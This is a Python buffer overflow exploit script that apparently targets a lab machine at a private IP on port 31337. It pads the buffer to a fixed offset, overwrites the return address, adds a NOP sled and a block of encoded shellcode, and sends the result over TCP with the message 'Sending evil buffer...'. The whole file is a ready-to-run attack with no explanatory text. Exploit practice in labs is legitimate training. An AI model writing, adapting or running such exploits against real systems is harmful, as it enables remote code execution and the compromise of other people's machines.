#!/usr/bin/env python3

import socket

ip = "10.10.209.219"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xbf\x16\x04\x08" 
padding = "\x90" * 16
payload = ("\xdb\xc1\xbb\xba\x87\xbb\xac\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x59\x31\x5a\x19\x83\xc2\x04\x03\x5a\x15\x58\x72\x47"
"\x44\x13\x7d\xb8\x95\x4b\xf7\x5d\xa4\x59\x63\x15\x95\x6d"
"\xe7\x7b\x16\x06\xa5\x6f\xad\x6a\x62\x9f\x06\xc0\x54\xae"
"\x97\xe5\x58\x7c\x5b\x64\x25\x7f\x88\x46\x14\xb0\xdd\x87"
"\x51\x06\xab\x68\x0f\x12\x01\x66\xe7\xaf\xe4\xba\x06\x60"
"\x63\x82\x70\x05\xb4\x76\xcd\x04\xe5\xfd\x95\x26\x8e\x49"
"\x3e\x26\x43\x19\xbb\xe1\x17\xa5\xf2\x0e\x9e\x5e\xc0\x7b"
"\x20\xb6\x18\xbc\xe2\xf9\x56\x90\xe4\xc2\x51\x08\x93\x38"
"\xa2\xb5\xa4\xfb\xd8\x61\x20\x1b\x7a\xe1\x92\xff\x7a\x26"
"\x44\x74\x70\x83\x02\xd2\x95\x12\xc6\x69\xa1\x9f\xe9\xbd"
"\x23\xdb\xcd\x19\x6f\xbf\x6c\x38\xd5\x6e\x90\x5a\xb1\xcf"
"\x34\x11\x50\x19\x48\xda\xaa\x26\x14\x4c\x66\xeb\xa7\x8c"
"\xe0\x7c\xdb\xbe\xaf\xd6\x73\xf2\x38\xf1\x84\x83\x2f\x02"
"\x5a\x2b\x3f\xfc\x5b\x4b\x69\x3b\x0f\x1b\x01\xea\x30\xf0"
"\xd1\x13\xe5\x6c\xd8\x83\x0c\x7b\xdb\xf0\x79\x79\xe3\xf7"
"\xc2\xf4\x05\xa7\x64\x56\x9a\x08\xd5\x16\x4a\xe1\x3f\x99"
"\xb5\x11\x40\x70\xde\xb8\xaf\x2c\xb6\x54\x49\x75\x4c\xc4"
"\x96\xa0\x28\xc6\x1d\x40\xcc\x89\xd5\x21\xde\xfe\x81\xc9"
"\x1e\xff\x27\xc9\x74\xfb\xe1\x9e\xe0\x01\xd7\xe8\xae\xfa"
"\x32\x6b\xa8\x05\xc3\x5d\xc2\x30\x51\xe1\xbc\x3c\xb5\xe1"
"\x3c\x6b\xdf\xe1\x54\xcb\xbb\xb2\x41\x14\x16\xa7\xd9\x81"
"\x99\x91\x8e\x02\xf2\x1f\xe8\x65\x5d\xe0\xdf\xf5\x9a\x1e"
"\x9d\xd1\x02\x76\x5d\x62\xb3\x86\x37\x62\xe3\xee\xcc\x4d"
"\x0c\xde\x2d\x44\x45\x76\xa7\x09\x27\xe7\xb8\x03\xe9\xb9"
"\xb9\xa0\x32\x4a\xc3\xc9\xc5\xab\x34\xc0\xa1\xac\x34\xec"
"\xd7\x91\xe2\xd5\xad\xd4\x36\x62\xbd\x63\x1a\xc3\x54\x8b"
"\x08\x13\x7d") 
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    try:
        s.connect((ip, port))
        #s.recv(1024)
        print("Sending evil buffer...")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        #s.recv(1024)
        print("Done!")
    except Exception as ex:
        print(f"Could not connect.\n\nError: {ex}")
